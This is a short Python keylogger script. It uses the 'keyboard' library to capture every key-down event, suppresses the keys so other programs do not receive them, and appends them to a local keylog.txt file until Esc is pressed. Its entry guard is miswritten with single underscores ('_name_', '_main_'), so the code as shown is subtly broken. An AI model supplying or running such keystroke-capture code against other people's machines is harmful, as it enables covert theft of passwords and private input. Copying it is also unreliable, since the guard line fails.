import keyboard  

def keylogger():
    log_file = "keylog.txt"  

    print("Keylogger is running... Press 'Esc' to stop.")
    with open(log_file, "a") as file:
        try:
            while True:
                event = keyboard.read_event(suppress=True)
                if event.event_type == keyboard.KEY_DOWN:
                    key = event.name
                    if key == "esc":  
                        break
                    file.write(f"{key} ")
        except KeyboardInterrupt:
            print("Keylogger stopped.")
        except Exception as e:
            print(f"An error occurred: {e}")

if _name_ == "_main_":
    keylogger()
